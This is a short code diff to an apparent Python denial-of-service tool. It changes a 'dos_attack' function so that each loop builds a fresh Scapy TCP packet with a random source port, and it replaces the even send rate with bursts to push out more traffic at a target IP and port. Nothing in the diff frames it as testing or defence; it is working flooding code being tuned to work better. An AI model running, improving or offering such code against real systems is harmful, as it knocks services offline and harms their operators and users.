@@ -38,11 +38,6 @@ def get_ngrok_url():
     return None
 
 def dos_attack(attack_id, target_ip, target_port, duration, rate):
-    packet = IP(dst=target_ip)/TCP(
-    dport=target_port,
-    sport=random.randint(1024, 65535)
-)
-    interval = 1 / rate
     end_time = time.time() + duration
     sent = 0
 
@@ -50,10 +45,20 @@ def dos_attack(attack_id, target_ip, target_port, duration, rate):
         if not active_attacks[attack_id]["running"]:
             break
 
+        # 🔥 CREATE NEW PACKET EACH TIME
+        packet = IP(dst=target_ip)/TCP(
+            dport=target_port,
+            sport=random.randint(1024, 65535)
+        )
+
         send(packet, verbose=0)
         sent += 1
+
         active_attacks[attack_id]["packets_sent"] = sent
-        time.sleep(interval)
+
+        # 🔥 BURST INSTEAD OF LINEAR
+        if sent % rate == 0:
+            time.sleep(0.1)
 
     active_attacks[attack_id]["running"] = False
 
